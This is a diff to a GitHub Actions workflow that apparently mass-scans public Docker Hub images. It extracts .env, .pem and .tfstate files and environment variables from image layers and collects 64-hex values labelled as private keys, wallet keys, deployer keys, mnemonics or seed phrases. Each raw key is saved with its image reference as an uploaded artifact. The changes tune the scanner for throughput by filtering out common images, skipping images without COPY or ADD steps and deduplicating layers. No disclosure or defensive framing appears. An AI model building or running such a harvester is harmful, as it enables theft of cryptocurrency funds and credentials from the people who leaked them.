@@ -17,40 +17,44 @@ jobs:
           sudo apt-get install -y jq
           curl -sL https://github.com/google/go-containerregistry/releases/latest/download/go-containerregistry_Linux_x86_64.tar.gz | tar -xz crane
           chmod +x crane
-          ./crane version
       - name: prep
         run: |
           python3 shard.py ${{ matrix.shard }} 20
-          wc -l slice_${{ matrix.shard }}.txt
+          grep -viE '(^|/)(postgres|nginx|redis|mongo|mysql|mariadb|kafka|zookeeper|elastic|kibana|logstash|grafana|prometheus|alpine|ubuntu|debian|centos|node|python|busybox|traefik|adminer|pgadmin|caddy|vault)(:|/|$)' slice_${{ matrix.shard }}.txt > f_${{ matrix.shard }}.txt || true
+          wc -l f_${{ matrix.shard }}.txt
       - name: scan
         run: |
           : > hits_${{ matrix.shard }}.tsv
-          ok=0; notag=0; nohit=0
+          : > seen_${{ matrix.shard }}.txt
+          ok=0; skip=0; nohit=0; notag=0
           LBL='(PRIVATE_KEY|PRIV_KEY|WALLET_KEY|DEPLOYER_KEY|SIGNER_KEY|_PK|MNEMONIC|SEED_PHRASE)'
           while read -r r; do
             [ -z "$r" ] && continue
             tag=$(curl -s "https://hub.docker.com/v2/repositories/$r/tags/?page_size=10&ordering=last_updated" | jq -r '.results[]?.name' 2>/dev/null | head -1) || true
             [ -z "$tag" ] && { notag=$((notag+1)); continue; }
-            m=$(./crane manifest --platform linux/amd64 "docker.io/$r:$tag" 2>/dev/null) || true
-            [ -z "$m" ] && { notag=$((notag+1)); continue; }
+            ref="docker.io/$r:$tag"
+            cfg=$(./crane config "$ref" 2>/dev/null) || true
+            if [ -z "$cfg" ]; then notag=$((notag+1)); continue; fi
+            hist=$(echo "$cfg" | jq -r '.history[]?.created_by' 2>/dev/null || true)
+            if ! echo "$hist" | grep -qiE '\b(COPY|ADD)\b'; then skip=$((skip+1)); continue; fi
             found=""
-            for d in $(echo "$m" | jq -r '.layers[]? | select(.size < 40000000) | .digest' 2>/dev/null); do
-              h=$(./crane blob "docker.io/$r@$d" 2>/dev/null | tar -xzO --wildcards '*.env' '*/.env' '*/.env.*' '*.env.*' '*.pem' '*.tfstate' 2>/dev/null \
-                  | grep -iE "$LBL" | grep -oE '(0x)?[0-9a-fA-F]{64}' || true)
+            for d in $(./crane manifest --platform linux/amd64 "$ref" 2>/dev/null | jq -r '[.layers[]? | select(.size < 40000000)] | .[-3:] | .[].digest' 2>/dev/null); do
+              grep -qxF "$d" seen_${{ matrix.shard }}.txt && continue
+              echo "$d" >> seen_${{ matrix.shard }}.txt
+              h=$(./crane blob "docker.io/$r@$d" 2>/dev/null | tar -xzO --wildcards '*.env' '*/.env' '*/.env.*' '*.env.*' '*.pem' '*.tfstate' 2>/dev/null | grep -iE "$LBL" | grep -oE '(0x)?[0-9a-fA-F]{64}' || true)
               [ -n "$h" ] && found="$found$h"$'\n'
             done
-            c=$(./crane config "docker.io/$r:$tag" 2>/dev/null | jq -r '.config.Env[]?' 2>/dev/null \
-                | grep -iE "$LBL" | grep -oE '(0x)?[0-9a-fA-F]{64}' || true)
+            c=$(echo "$cfg" | jq -r '.config.Env[]?' 2>/dev/null | grep -iE "$LBL" | grep -oE '(0x)?[0-9a-fA-F]{64}' || true)
             [ -n "$c" ] && found="$found$c"$'\n'
             found=$(printf '%s' "$found" | grep -v '^$' | sort -u)
             if [ -n "$found" ]; then
               ok=$((ok+1))
-              echo "$found" | while read -r k; do printf '%s\t%s\n' "$k" "docker.io/$r:$tag" >> hits_${{ matrix.shard }}.tsv; done
+              echo "$found" | while read -r k; do printf '%s\t%s\n' "$k" "$ref" >> hits_${{ matrix.shard }}.tsv; done
             else
               nohit=$((nohit+1))
             fi
-          done < slice_${{ matrix.shard }}.txt
-          echo "ok=$ok notag=$notag nohit=$nohit"
+          done < f_${{ matrix.shard }}.txt
+          echo "ok=$ok notag=$notag skip_nocopy=$skip nohit=$nohit"
           wc -l hits_${{ matrix.shard }}.tsv
       - uses: actions/upload-artifact@v4
         if: always()
